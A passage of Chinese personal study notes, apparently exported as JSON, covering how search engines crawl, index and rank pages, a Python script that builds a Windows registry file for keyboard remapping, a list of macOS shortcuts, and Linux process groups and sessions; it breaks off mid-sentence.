高质量的外链\n张三是班上公认的人品好为人公正的学霸，李四是班上惹人讨厌最爱撒谎的学生，张三给大家说王五这个人真的很聪明为人也很善良，其他同学都会认为王五肯定是这样，李四给其他同学说王五这个人很好，其他同学基本不会相信李四的鬼话。\n同样一句话，从不同人的嘴里说出来，造成的结果、影响都不一样。\n链接的引用也是这样，比如在一个蜘蛛认为的高质量页面中，页面在最后引用了一个链接，指向你的页面，那么这个高质量页面的引用，在蜘蛛判断你的网页是否是高质量网页时，也会产生一定的影响，被高质量网页引用的多了（超级多的大佬夸你人好），那么蜘蛛在判断你页面时产生的影响也就更大（同学也觉得你就是人好）。\n\n4. 与首页的距离\n一般来说自己网站被其他网站引用最多的页面就是首页，所以它的权重相比来说是最高的，比如A页面是A网站的首页，可以得出的结论是，离A网页更进的页面，页面权重也容易更高，比如A页面上的超链接更容易被蜘蛛爬行，更容易获得蜘蛛的抓取，那些没被蜘蛛发现的网页，权重自然就是0。\n还有一点比较重要的是，蜘蛛在爬行页面时会进行一定程度的复制检测，也就是当前被爬行的页面的内容，是否和已经保存的数据有重合（当页面内容为转载/不当抄袭行为时就会被蜘蛛检测出来），如果一个权重很低的网站上有大量转载/抄袭行为，蜘蛛很可能不会再继续爬行。\n之所以要这么做也是为了用户的体验，如果没有这些去重步骤，当用户想要搜索一些内容时，发现返回的结果全都是一模一样的内容，会大大影响用户的体验，最后导致的结果就是这个搜索引擎绝对不会有人再用了，所以为了用户使用的便利，也是为了自己公司的正常发展。\n\n### 地址库\n互联网上的网页这么多，为了避免重复爬行和抓取网页，搜索引擎会建立地址库，一个是用来记录已经被发现但还没有抓取的页面，一个是已经被抓取过的页面。\n\n待访问地址库（已经发现但没有抓取）中的地址来源于下面几种方式：\n1. 人工录入的地址\n2. 蜘蛛抓取页面后，从HTML代码中获取新的链接地址，和这两个地址库中的数据进行对比，如果没有，就把地址存入待访问地址库。\n3. 站长（网站负责人）提交上去的想让搜索引擎抓取的页面。（一般这种效果不大）\n\n蜘蛛按照重要性从待访问地址库中提取URL，访问并抓取页面，然后把这个URL地址从待访问地址库中删除，放进已访问地址库中。\n\n### 文件存储\n蜘蛛会将抓取的数据存入原始页面数据库。\n存入的数据和服务器返回给蜘蛛的HTML内容是一样的，每个页面存在数据库里时都有自己的一个独一无二的文件编号。\n\n## 预处理\n我们去商场买菜时，会看到蔬菜保险柜里的这些蔬菜被摆放的整整齐齐，这里举的例子是那些用保鲜膜包好有经过包装的蔬菜。\n最后呈现在顾客面前的是包装完好，按照不同的分类摆放有序，顾客一眼就能很清楚的看到每个区域分别是什么蔬菜。\n在最终完成这个结果之前，整个流程大概也是三个步骤：\n1. 选出可以售卖的蔬菜\n从一堆蔬菜中，选出可以拿去售卖的蔬菜。\n2. 预处理\n此时你面前摆放的就是全部可以拿去售卖的蔬菜了，但是如果，今天就要把这些蔬菜放到蔬菜保险柜中的话，你今天才开始对这些蔬菜进行整理会浪费大量的时间（给蔬菜进行包装等），说不定顾客来了蔬菜还没整理好。\n所以你的解决方法是，提前将这些可以拿去售卖的蔬菜提前包装好，存放在仓库里，等保险柜中的蔬菜缺少了需要补货时，花个几分钟时间跑去仓库把蔬菜拿出来再摆放再货架上就行了。（我猜的，具体商场里的流程是怎么样的我也不知道，为了方便后续的理解用生活上的例子进行说明效果会更好）\n3. 摆放上保险柜\n也就是上面最后一段内容那样，当需要补货时，从仓库里拿出包装好的蔬菜，按照蔬菜的类别摆放到合适的位置就可以了，这个就是最后的排序步骤。\n\n回到搜索引擎的工作流程中，这个预处理的步骤就和上面商场预处理步骤的作用一样。\n\n当蜘蛛完成数据收集后，就会进入到这个步骤。\n\n蜘蛛所完成的工作，就是在收集了数据后将数据（HTML）存入原始页面数据库。\n而这些数据，不是用户在搜索后，直接用来进行排序并展示在搜索结果页的数据。\n\n原始页面数据库中的页面数量都是在数万亿级别以上，如果在用户搜索后对原始页面数据库中的数据进行实时排序，让排名程序（每个步骤所使用的程序不一样，收集数据的程序叫蜘蛛，排名时所用的程序是排名程序）分析每个页面数据与用户想搜索的内容的相关性，计算量太大，会浪费太多时间，不可能在一两秒内返回排名结果。\n\n因此，我们需要先将原始页面数据库中的数据进行预处理，为最后的排名做好准备。\n\n### 提取文字\n我们存入原始页面数据库中的，是HTML代码，而HTML代码中，不仅有用户在页面上直接可以看到的文字内容，还有其他例如js，AJAX等这类搜索引擎无法用于排名的内容。\n首先要做的，就是从HTML文件中去除这些无法解析的内容，提取出可以进行排名处理步骤的文字内容\n比如下面这段代码\n```html\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta name=\"description\" content=\"这是一个描述内容\"/>\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no\">\n    <link rel=\"icon\" type=\"image/png\" sizes=\"32x32\" href=\"//static001.infoq.cn/static/infoq/www/img/InfoQ-share-icon2.jpg\">\n    <title>软件工程师需要了解的搜索引擎知识</title>\n    <script type=\"text/javascript\" src=\"//res.wx.qq.com/open/js/jweixin-1.4.0.js\"></script>\n    <script type=\"text/x-mathjax-config\">\n      MathJax.Hub.Config({\n        showProcessingMessages: false,\n        messageStyle: \"none\",\n        tex2jax: {\n          inlineMath: [['$','$'], ['\\\\(','\\\\)']],\n          displayMath: [ [\"$$\",\"$$\"] ],\n          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code', 'a']\n        }\n      });\n      MathJax.Hub.Register.MessageHook(\"End Process\", function (message) {\n        var eve = new Event('mathjaxfini')\n        window.dispatchEvent(eve)\n      })\n    </script>\n</head>\n<body>\n<div id=\"app\">hi</div>\n<img alt=\"Google\" src=\"/images/test.png\" \n</body>\n</html>\n```\n可以看出整个HTML中，真正属于文字内容的信息只有两句\n```\n这是一个描述内容\n软件工程师需要了解的搜索引擎知识\nhi\nGoogle\n```\n搜索引擎最终提取出来的信息就是这四句，用于排名的文字也是这四句。\n可以提取出来的文字内容大概就是，Meta标签中的文字、img标签alt属性中的文字、Flash文件的替代文字、链接锚文字等。\n\n#### 中文分词\n分词是中文搜索引擎特有的步骤，搜索引擎存储/处理页面/用户搜索时都是以词为基础的。\n```\nI'm fine, and you?\n```\n中文和英文等语言单词不同，在使用英文时各个单词会有空格分隔，搜索引擎可以直接把每一个句子划分为多个英文单词的集合。而对中文来说，词汇和词汇之间是没有任何分隔符可以对各词汇进行分隔的。\n```\n比如这句话里的词就是连接在一起的\n```\n对于这种情况，搜索引擎首先需要分辨哪几个字组成一个词，如 我喜欢吃【水果】，或者哪些字本身就是一个词，如 这里有【水】，\n再如下面这句话\n```\n你好，这是一篇关于搜索引擎的文章\n```\n搜索引擎会将这一段文字拆解成一个个词汇，大概如下\n```\n你好\n这是\n一篇\n关于\n搜索引擎\n的\n文章\n```\n搜索引擎将这段文字拆解成了7个词汇（我瞎猜的，具体多少个我也不知道，每个搜索引擎分词的方法都不一样）\n\n中文分词的方法基本上有两种：\n- 基于词典匹配\n- 基于统计\n\n1. 基于词典匹配\n将需要分析的一段汉字与一个时间创建好的词典中的词条进行匹配，如果在这段汉字中扫描到词典中已有的词条则匹配成功。\n这种匹配方式最简单，但匹配的正确程序取决于这个词典的完整性和更新情况。\n\n2. 基于统计\n一般是通过机器学习完成，通过对海量网页上的文字样本进行分析，计算出字与字相邻出现的统计概率，几个字相邻出现越多，就越可能形成一个词。\n这种优势是对新出现的词反应更快速。\n\n实际使用中的分词系统都是两种方法同时混合使用。\n\n#### 去停止词\n不管是英文还是中文，页面中都会有一些出现频率很高的&对内容没有任何影响的词，如中文的【的】、【啊】、【哈】之类，这些词被称为停止词。\n英文中常见的停止词有`[the]/[a]/[an]`等。\n\n搜索引擎会去掉这些停止词，使数据主题更突出，减少无谓的计算量。\n\n#### 去掉噪声词\n大部分页面里有这么一部分内容对页面主题没什么贡献，比如A页面的内容是一篇关于SEO优化的文章，关键词是SEO，但是除了讲解SEO这个内容的主体内容外，共同组成这个页面的还有例如页眉，页脚，广告等区域\n![](https://gitee.com/NaisWang/images/raw/master/img/20211101224527.png)\n\n在这些部分出现的词语可能和页面内容本身的关键词并不相关。\n比如导航栏中如何出现【历史】这个词，导航栏上想要表达的实际是历史记录之类的意思，搜索引擎可能会把他误以为是XX国家历史，XX时代历史之类这种层面的【历史】，搜索引擎所理解的和页面本身内容想表达的完全不相关，所以这些区域都属于噪声，在搜索引擎分析一个页面的时候，它们只会对页面主题起到分散作用。\n搜索引擎的排名程序在对数据进行排名时不能参考这些噪声内容，我们在预处理阶段就需要把这些噪声时别出来并消除他们。\n消除噪声的方法是根据HTML的标签对页面进行分块，如页眉是header标签，页脚是footer标签等等，去除掉这些区域后，剩下的才是页面主体内容。\n\n#### 引导搜索引擎分词\n当你搜索`2021大连续返乡`时，你会发现百度会搜索出含有“连续”/“返乡”字样的文章。而不是搜索出含有“大连”字样的文章\n![](https://gitee.com/NaisWang/images/raw/master/img/20211102081211.png)\n这是因为百度将“大连续”中的“连续”分成了一个词，而不是将`大连`分成一个词，所以会搜索出含有“连续”/“返乡”字样的文章。而不是搜索出含有“大连”字样的文章。\n为了让百度搜索出含有“大连”字样的文章，我们需要引导百度将“大连”分成一个词，具体方法是加空格，如：`2021大连 续返乡`, 搜索的结果如下：\n![](https://gitee.com/NaisWang/images/raw/master/img/20211102081935.png)\n\n>总结：在你搜索很长的句子的时候，你可以适当的通过加空格去引导搜索引擎按照你的想法给你分词，因为分词准确了，才更有可能得到你想要搜索的东西\n\n### 去重\n也就是去掉重复的网页，同一篇文章经常会重复在不同网站/同一个网站的不同网址上。为了用户的体验，去重步骤是必须的，搜索引擎会对页面进行识别&删除重复内容，这个过程称为蛆虫和。\n去重的方法是先从页面主体内容中选取最有代表性的一部分关键词（经常是出现频率最高的关键词，由于之前已经有了去停止词的步骤，因此在这时出现频率最高的关键词可能就真的是整个页面的关键词了），然后计算这些关键词的数字指纹。\n通常我们在页面中选取10个关键词就可以达到比较高的计算准确性了。\n典型的指纹计算方法如MD5算法（信息摘要算法第五版）。这类指纹算法的特点是，输入（也就是上面提取出来的关键词）只要有任何微小的变化，都会导致计算出的指纹有很大差距。\n比如我们用两个数相乘，第一组和第二组的不同仅仅是第一个数字 0.001 的差别，最终生成的结果却千差万别。\n![](https://gitee.com/NaisWang/images/raw/master/img/20211101224610.png)\n\n了解了搜索引擎的去重算法后，就会发现那些在文章发布者眼里的原创内容实际对搜索引擎来说就是非原创，比如简单的增加/删除【的】【地】等这些去停止词、调换段落顺序、混合不同文章等操作，在搜索引擎进行去重算法后，都会被判断为非原创内容，因为这些操作并不会改变文章的关键词。\n（比如我写的这篇笔记里的一些段落就是‘借鉴’了一下，我是从书里看的不是在网页上直接浏览的，如果搜索引擎在对我这篇文章进行文字提取、分词、消噪、去重后，发现剩下的关键词和已收录的某个网页数据的内容都匹配上了，就会认为我是伪原创甚至非原创，最终影响的就是我这篇文章在搜索引擎工作原理这个关键词上的排名）\n\n### 正向索引\n正向索引可以简称为索引。\n经过上述各步骤（提取、分词、消噪、去重）后，搜索引擎最终得到的就是独特的、能反映页面主体内容的、以词为单位的内容。\n\n接下来由搜索引擎的索引程序提取关键词，按照分词程序划分好的词，把页面转换为一个由关键词组成的集合，同时还需要记录每一个关键词在页面上的出现频率、出现次数、格式（如是出现在标题标签、黑体、h标签、还是锚文字等）、位置（如页面第一段文字等）。\n\n搜索引擎的索引程序会将页面和关键词形成的词表结构存储进索引库。\n简化的索引词表形式如图\n![](https://gitee.com/NaisWang/images/raw/master/img/20211101224644.png)\n\n每个文件都对应一个文件ID，文件内容被表示成一串关键词的集合。\n实际上在搜索引擎索引库中，关键词也已经转换为关键词ID，这样的数据结构被称为正向索引。\n\n### 倒排索引\n正向索引不能直接用于排名，假设用户搜索关键词【2】，如果只存在正向索引，排名程序需要扫描所有索引库中的文件，找出包含关键词【2】的文件，再进行相关性计算。\n这样的计算量无法满足实时返回排名结果的要求。\n\n我们可以提前对所有关键词进行分类，搜索引擎会将正向索引数据库重新构造为倒排索引，把文件对应到关键词的映射转换为关键词到文件的映射，如下图\n![](https://gitee.com/NaisWang/images/raw/master/img/20211101224710.png)\n\n在倒排索引中关键词是主键，每个关键词都对应着一系列文件，比如上图第一排右侧显示出来的文件，都是包含了关键词1的文件。\n这样当用户搜索某个关键词时，排序程序在倒排索引中定位到这个关键词，就可以马上找出所有包含这个关键词的文件。\n\n## 给搜索结果进行排名\n经过前面的蜘蛛抓取页面，对数据预处理&索引程序计算得到倒排索引后，搜索引擎就准备好可以随时处理用户搜索了。\n用户在搜索框输入想要查询的内容后，排名程序调用索引库的数据，计算排名后将内容展示在搜索结果页中。\n\n### 搜索词处理\n搜索引擎接收到用户输入的搜索词后，需要对搜索词做一些处理，然后才进入排名过程。\n搜索词处理过程包括如下几个方面：\n1. 中文分词\n和之前预处理步骤中的分词流程一样，搜索词也必须进行中文分词，将查询字符串转换为以词为单位的关键词组合。\n分词原理和页面分词时相同。\n2. 去停止词\n同上。\n3. 指令处理\n上面两个步骤完成后，搜索引擎对剩下的内容的默认处理方式是在关键词之间使用【与】逻辑。\n比如用户在搜索框中输入【减肥的方法】，经过分词和去停止词后，剩下的关键词为【减肥】、【方法】，搜索引擎排序时默认认为，用户想要查询的内容既包含【减肥】，也！注意这个也！！！也包含【方法】！\n只包含【减肥】不包含【方法】，或者只包含【方法】不包含【减肥】的页面，都会被认为是不符合搜索条件的。\n\n### 文件匹配\n搜索词经过上面的处理后，搜索引擎得到的是以词为单位的关键词集合。\n进入的下一个阶段-文件匹配阶段，就是找出含有所有关键词的文件。\n在索引部分提到的倒排索引使得文件匹配能够快速完成，如下图\n![](https://gitee.com/NaisWang/images/raw/master/img/20211101224851.png)\n\n假设用户搜索【关键词2 关键词7】，排名程序只要在倒排索引中找到【关键词2】和【关键词7】这两个词，就能找到分别含有这两个词的所有页面文件。\n经过简单计算就能找出既包含【关键词2】，也包含【关键词7】的所有页面：【文件1】和【文件6】。\n\n### 初始子集的选择\n找到包含所有关键词的匹配文件后，还不能对这些文件进行相关性计算，因为在实际情况中，找到的文件经常会有几十万几百万，甚至上千万个。要对这么多文件实时进行相关性计算，需要的时间还是挺长的。\n实际上大部分用户只喜欢查看前面两页，也就是前20个结果，后面的真的是懒都懒得翻！\n\n由于所有匹配文件都已经具备了最基本的相关性（这些文件都包含所有查询关键词），搜索引擎会先筛选出1000个页面权重较高的一个文件，通过对权重的筛选初始化一个子集，再对这个子集中的页面进行相关性计算。\n\n### 相关性计算\n用权重选出初始子集之后，就是对子集中的页面计算关键词相关性的步骤了。\n\n计算相关性是排名过程中最重要的一步。\n\n影响相关性的主要因素包括如下几个方面：\n1. 关键词常用程度。\n经过分词后的多个关键词，对整个搜索字符串的意义贡献并不相同。\n越常用的词对搜索词的意义贡献越小，越不常用的词对搜索词的意义贡献越大。举个例子，假设用户输入的搜索词是“我们冥王星”。“我们”这个词常用程度非常高，在很多页面上会出现，它对“我们冥王星”这个搜索词的辨识程度和意义相关度贡献就很小。找出那些包含“我们”这个词的页面，对搜索排名相关性几乎没有什么影响，有太多页面包含“我们”这个词。\n而“冥王星”这个词常用程度就比较低，对“我们冥王星”这个搜索词的意义贡献要大得多。那些包含“冥王星”这个词的页面，对“我们冥王星”这个搜索词会更为相关。\n常用词的极致就是停止词，对页面意义完全没有影响。\n所以搜索引擎对搜索词串中的关键词并不是一视同仁地处理，而是根据常用程度进行加权。不常用的词加权系数高，常用词加权系数低，排名算法对不常用的词给予更多关注。\n我们假设A、B两个页面都各出现“我们”及“冥王星”两个词。但是“我们”这个词在A页面出现于普通文字中，“冥王星”这个词在A页面出现于标题标签中。B页面正相反，“我们”出现在标题标签中，而“冥王星”出现在普通文字中。那么针对“我们冥王星”这个搜索词，A页面将更相关。\n2. 词频及密度。一般认为在没有关键词堆积的情况下，搜索词在页面中出现的次数多，密度越高，说明页面与搜索词越相关。当然这只是一个大致规律，实际情况未必如此，所以相关性计算还有其他因素。出现频率及密度只是因素的一部分，而且重要程度越来越低。\n3. 关键词位置及形式。就像在索引部分中提到的，页面关键词出现的格式和位置都被记录在索引库中。关键词出现在比较重要的位置，如标题标签、黑体、H1等，说明页面与关键词越相关。这一部分就是页面SEO所要解决的。\n4. 关键词距离。切分后的关键词完整匹配地出现，说明与搜索词最相关。比如搜索“减肥方法”时，页面上连续完整出现“减肥方法”四个字是最相关的。如果“减肥”和“方法”两个词没有连续匹配出现，出现的距离近一些，也被搜索引擎认为相关性稍微大一些。\n5. 链接分析及页面权重。除了页面本身的因素，页面之间的链接和权重关系也影响关键词的相关性，其中最重要的是锚文字。页面有越多以搜索词为锚文字的导入链接，说明页面的相关性越强。\n链接分析还包括了链接源页面本身的主题、锚文字周围的文字等。\n\n\n\n"
  },
  {
    "title": "./notes/软件/快捷键.md",
    "body": "# 键位\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/MK293.jpeg)\n\n## window修改键位\n\n**步骤：**\n创建如下2个文件：\n文件名：keyword.txt\n```\nCaps Lock: Esc;\nEsc: `;\n`: Caps Lock;\nSemicolon: Backspace;\nBackspace: \\;\n\\: /;\n/: Semicolon; \n```\n上述文件的作用：把Esc键换成Caps Lock键， 把Caps Lock键换成Esc键； 其他同理\n\n文件名：keyword.py\n```python\nimport sys\nimport os\n\nsave_format = \"reg\"    #这个值可以修改，有两个选项(bat和reg)，可选择生成bat批处理文件或者reg注册表脚本文件,功能一样\n\nclass CountError(Exception):    #文本文件格式错误异常\n    pass\n\nclass FileFormatError(Exception):    #save_format值异常\n    pass\n\n\nif save_format not in [\"bat\",\"reg\"]:\n    raise FileFormatError(\"The variable 'save_format'`s value must be 'bat' or 'reg'.\")\n\n\nif __name__ == \"__main__\":\n    \n    if not os.path.isdir(\"layout_\"+save_format):\n        os.mkdir(\"layout_\"+save_format)\n\n    if len(sys.argv) == 1:\n        if save_format == \"bat\":\n            with open(\"layout_bat/recover.bat\",'w', encoding=\"utf-8\") as f:\n                f.write('@echo off\\nreg delete \"hklm\\\\system\\\\currentcontrolset\\\\control\\\\keyboard layout\" /v \"ScanCode Map\" /f\\necho \"键位已恢复，重启系统后生效\"\\npause')\n            input(\"恢复文件recover.bat已生成至layout_bat文件夹下，以管理员身份右键执行该文件后重启系统生效。\\n按回车键退出程序...\")\n\n        else:\n            with open(\"layout_reg/recover.reg\",'w', encoding=\"utf-8\") as f:\n                f.write('Windows Registry Editor Version 5.00\\n[HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Keyboard Layout]\\n\"ScanCode Map\"=hex:00,00,00,00,00,00,00,00,01,00,00,00,00,00,00,00')\n            input(\"恢复文件recover.reg已生成至layout_reg文件夹下，双击执行该文件后重启系统生效。\\n按回车键退出程序...\")\n\n    elif len(sys.argv) == 2:\n        scan_code_dict = {\n            \"00 00\":\"None\",\n            \"01 00\":\"Esc\",    #即Esc键的扫描码是\"0001\"\n            \"02 00\":\"1\",\n            \"03 00\":\"2\",\n            \"04 00\":\"3\",\n            \"05 00\":\"4\",\n            \"06 00\":\"5\",\n            \"07 00\":\"6\",\n            \"08 00\":\"7\",\n            \"09 00\":\"8\",\n            \"0a 00\":\"9\",\n            \"0b 00\":\"0\",\n            \"0c 00\":\"-\",\n            \"0d 00\":\"=\",\n            \"0e 00\":\"Backspace\",\n            \"0f 00\":\"Tab\",\n            \"10 00\":\"Q\",\n            \"11 00\":\"W\",\n            \"12 00\":\"E\",\n            \"13 00\":\"R\",\n            \"14 00\":\"T\",\n            \"15 00\":\"Y\",\n            \"16 00\":\"U\",\n            \"17 00\":\"I\",\n            \"18 00\":\"O\",\n            \"19 00\":\"P\",\n            \"1a 00\":\"[\",\n            \"1b 00\":\"]\",\n            \"1c 00\":\"Enter\",\n            \"1d 00\":\"Left Ctrl\",\n            \"1e 00\":\"A\",\n            \"1f 00\":\"S\",\n            \"20 00\":\"D\",\n            \"21 00\":\"F\",\n            \"22 00\":\"G\",\n            \"23 00\":\"H\",\n            \"24 00\":\"J\",\n            \"25 00\":\"K\",\n            \"26 00\":\"L\",\n            \"27 00\":\"Semicolon\",    #由评论区指出，键盘上的“;”应该用其他值代替，否则会与配置文本文件中的“;”混淆\n            \"28 00\":\"'\",\n            \"29 00\":\"`\",\n            \"2a 00\":\"Left Shift\",\n            \"2b 00\":\"\\\\\",\n            \"2c 00\":\"Z\",\n            \"2d 00\":\"X\",\n            \"2e 00\":\"C\",\n            \"2f 00\":\"V\",\n            \"30 00\":\"B\",\n            \"31 00\":\"N\",\n            \"32 00\":\"M\",\n            \"33 00\":\",\",\n            \"34 00\":\".\",\n            \"35 00\":\"/\",\n            \"36 00\":\"Right Shift\",\n            \"37 00\":\"n*\",\n            \"38 00\":\"Left Alt\",\n            \"39 00\":\"Space\",\n            \"3a 00\":\"Caps Lock\",\n            \"3b 00\":\"F1\",\n            \"3c 00\":\"F2\",\n            \"3d 00\":\"F3\",\n            \"3e 00\":\"F4\",\n            \"3f 00\":\"F5\",\n            \"40 00\":\"F6\",\n            \"41 00\":\"F7\",\n            \"42 00\":\"F8\",\n            \"43 00\":\"F9\",\n            \"44 00\":\"F10\",\n            \"45 00\":\"Num Lock\",\n            \"46 00\":\"Scroll Lock\",\n            \"47 00\":\"n7\",\n            \"48 00\":\"n8\",\n            \"49 00\":\"n9\",\n            \"4a 00\":\"n-\",\n            \"4b 00\":\"n4\",\n            \"4c 00\":\"n5\",\n            \"4d 00\":\"n6\",\n            \"4e 00\":\"n+\",\n            \"4f 00\":\"n1\",\n            \"50 00\":\"n2\",\n            \"51 00\":\"n3\",\n            \"52 00\":\"n0\",\n            \"53 00\":\"n.\",\n            \"57 00\":\"F11\",\n            \"58 00\":\"F12\",\n\n            \n            \"1c e0\":\"nEnter\",\n            \"1d e0\":\"Right Ctrl\",\n            \"37 e0\":\"PrtSc\",\n            \"38 e0\":\"Right Alt\",\n            \"47 e0\":\"Home\",\n            \"48 e0\":\"Up\",\n            \"49 e0\":\"Page Up\",\n            \"4b e0\":\"Left\",\n            \"4d e0\":\"Right\",\n            \"4f e0\":\"End\",\n            \"50 e0\":\"Down\",\n            \"51 e0\":\"Page Down\",\n            \"52 e0\":\"Insert\",\n            \"53 e0\":\"Delete\",\n            \"5b e0\":\"Left Windows\",\n            \"5c e0\":\"Right Windows\",\n            }\n\n        fun_key_dict = dict((m.upper(),n) for n,m in scan_code_dict.items())    #键值互换,键值全大写\n        content = '00 00 00 00 00 00 00 00'\n        \n        #用于暂时保存映射前后的键位，判断这次键位修改是否有风险\n        before_map_set = set()\n        after_map_set = set()\n\n        with open(sys.argv[1], encoding=\"utf-8\") as f:\n            p = f.read().strip().split(';')\n            p.remove('')\n            content += ' {:0>2x} 00 00 00'.format(len(p)+1)\n            try:\n                for i in p:\n                    if len(i.strip().split(':')) == 2:\n                        before_map_set.add(i.split(':')[0].strip().upper())\n                        after_map_set.add(i.split(':')[1].strip().upper())\n                        content += ' '+fun_key_dict[i.split(':')[1].strip().upper()]+' '+fun_key_dict[i.split(':')[0].strip().upper()]\n                    else:\n                        raise CountError\n                content += ' 00 00 00 00'\n            except KeyError:\n                print(\"文件中键名称有误\")\n                \n            except CountError:\n                print(\"文件中未按格式书写\")\n            else:\n                if before_map_set != after_map_set:\n                    run = input(\"此次键位替换存在风险，{}键功能将在键盘上无对应按键，是否继续？(输入y继续，否则退出程序)\".format(str(before_map_set-after_map_set)[1:-1]))\n                    if run != 'y':\n                        sys.exit()\n\n                if save_format == \"bat\":\n                    with open(\"layout_bat/\"+'.'.join(sys.argv[1].split('\\\\')[-1].split('.')[:-1])+'.bat','w', encoding=\"utf-8\") as g:\n                        g.write('@echo off\\nreg add \"hklm\\\\system\\\\currentcontrolset\\\\control\\\\keyboard layout\" /v \"ScanCode Map\" /t REG_BINARY /d \"{}\" /f\\necho \"键位已完成修改，重启系统后生效\"\\npause'.format(''.join(content.split())))\n                    input(\"...\\n{}文件已生成至layout_bat目录下，右键以管理员身份执行该文件后重启系统生效。\\n按回车键退出程序...\".format('.'.join(sys.argv[1].split('\\\\')[-1].split('.')[:-1])+'.'+save_format))\n\n                else:\n                    with open(\"layout_reg/\"+'.'.join(sys.argv[1].split('\\\\')[-1].split('.')[:-1])+'.reg','w', encoding=\"utf-8\") as g:\n                        g.write('Windows Registry Editor Version 5.00\\n[HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Keyboard Layout]\\n\"ScanCode Map\"=hex:{}'.format(','.join(content.split())))\n\n                    input(\"...\\n{}文件已生成至layout_reg目录下，双击执行该文件后重启系统生效。\\n按回车键退出程序...\".format('.'.join(sys.argv[1].split('\\\\')[-1].split('.')[:-1])+'.'+save_format))\n    else:\n        input(\"传入参数错误，按回车键退出程序...\")\n```\n\n然后运行`python keyword.py keyword.txt`，会在当前运行目录下生成一个layout_reg目录，且该目录下会生成一个recover.reg文件，运行这个reg文件既可以完成换键\n\n# 组合键\n## option\noption 被用来当作 窗口操作 键\n\n- `option + [shift] + L/H/M`: 控制窗口大小与位置\n- `option + s` : 调出浏览器\n- `option + i` : 调出idea\n- `option + w` : 调出webstrom\n- `option + e` : 调出资源管理器\n- `option + enter` : 调出终端\n- `option + o` : 调出 wps\n- `option + n` : 隐藏其他窗口\n- `option + d` : 回到桌面\n- `option + .` : 切换到右边桌面\n- `option + ,` : 切换到左边桌面\n- `option + a` : 展开控制中心页面\n\n## command\ncommand 被用来操作光标，以及文本编辑操作\n\n- `command + h/j/k/l` : 方向键\n- `command + i` : 光标回到句首\n- `command + 4` : 光标回到句尾\n- `command + e` : 光标跳转到下一个单词处\n- `command + b` : 光标跳转到上一个单词处\n- `command + u` : page_up\n- `command + d` : page_down\n- `command + backspace` : delete键\n- `command + a/c/v/x/s/z/y/f/` : 全选/复制/粘贴/剪切/保存/undo/redo/搜索\n- `command + w/q` : 关闭当前窗口/退出当前应用\n\n## control\ncontrol 用来 当作写代码 相关组合键\n- `control + a` : 显示方法参数信息\n- `control + k` : quick Documentation\n- `control + shift + k` : external Documentation\n- `control + e` : 错误/警告描述ErrorDescription\n- `control + f` : show context actions\n- `control + g` : Generate\n- `control + r` : 重命名\n- `control + c` : 快速生成函数注释(Fix doc comment)\n- `control + s` : Surround with\n- `control + m` : 快速导包\n- `control + p` : 显示/关闭资源目录窗口\n- `control + n` : 显示/关闭其他非编辑窗口\n- `control + o` : Back\n- `control + i` : Forward\n- `control + [shift] + tab` : 切换标签页\n\n## hyper\nhyper 用来 当作全局快捷键的 前缀键\n\n- `hyper + z` : 显示单词查询悬浮窗口\n- `hyper + 3` : Save picture of selected area as file\n- `hyper + 4` : Copy picture of selected area to the clipboard\n- `hyper + 5` : Screenshot and recording options\n\n"
  },
  {
    "title": "./notes/软件/linux.md",
    "body": "# 进程、进程组、作业、session\n## 进程、进程组与作业\n每个进程都会属于一个进程组，进程组中可以包含一个或多个进程。进程组中有一个进程组长，组长的进程 ID 是进程组 ID(PGID)\n```bash\n$ ps -o pid,pgid,ppid,comm | cat\n  PID  PGID  PPID  COMMAND\n10179  10179 10177 bash\n10263  10263 10179 ps\n10264  10263 10179 cat\n```\n下边通过简单的示例来理解进程组\n- bash：进程和进程组ID都是 10179，父进程其实是 sshd(10177)\n- ps：进程和进程组ID都是 10263，父进程是 bash(10179)，因为是在 Shell 上执行的命令\n- cat：进程组 ID 与 ps 的进程组 ID 相同，父进程同样是 bash(10179)\n\n容易理解 Bash 就是Shell进程，Shell 父进程是 sshd；ps 与 cat 通过管道符号一起运行，属于一个进程组，其父进程都是 Bash；一个进程组也被称为「作业」。\n\n## session\n我们常见的 Linux session 一般是指 shell session。Shell session 是终端中当前的状态，在终端中只能有一个 session。当我们打开一个新的终端时，总会创建一个新的 shell session。\n\n就进程间的关系来说，session 由一个或多个进程组组成。一般情况下，来自单个登录的所有进程都属于同一个 session。我们可以通过下图来理解进程、进程组和 session 之间的关系：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220425205747.png)\n\n会话是由会话中的第一个进程创建的，一般情况下是打开终端时创建的 shell 进程。该进程也叫 session 的领头进程。Session 中领头进程的 PID 也就是 session 的 SID。我们可以通过下面的命令查看 SID：\n\n```bash\n$ ps -o pid,ppid,pgid,sid,tty,comm\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220425205822.png)\n\nSession 中的每个进程组被称为一个 job，有一个 job 会成为 session 的前台 job(foreground)，其它的 job 则是后台 job(background)。每个 session 连接一个控制终端(control terminal)，控制终端中的输入被发送给前台 job，从前台 job 产生的输出也被发送到控制终端上。同时由控制终端产生的信号，比如 ctrl + z 等都会传递给前台 job。\n\n一般情况下 session 和终端是一对一的关系，当我们打开多个终端窗口时，实际上就创建了多个 session。\n\nSession 的意义在于多个工作(job)在一个终端中运行，其中的一个为前台 job，它直接接收该终端的输入并把结果输出到该终端。其它的 job 则在后台运行。\n\n### session 的诞生与消亡\n通常，新的 session 由系统登录程序创建，session 中的领头进程是运行用户登录 shell 的进程。新创建的每个进程都会属于一个进程组，当创建一个进程时，它和父进程在同一个进程组、session 中。\n\n将进程放入不同 session 的惟一方法是使用 setsid 函数使其成为新 session 的领头进程。这还会将 session 领头进程放入一个新的进程组中。\n\n当 session 中的所有进程都结束时 session 也就消亡了。实际使用中比如网络断开了，session 肯定是要消亡的。另外就是正常的消亡，比如让 session 的领头进程退出。一般情况下 session 的领头进程是 shell 进程，如果它处于前台，我们可以使用 exit 命令或者是 ctrl + d 让它退出。或者我们可以直接通过 kill 命令杀死 session 的领头进程。这里面的原理是：当系统检测到挂断(hangup)条件时，内核中的驱动会将 SIGHUP 信号发送到整个 session。通常情况下，这会杀死 session 中的所有进程。\n\n### session 与终端的关系\n如果 session 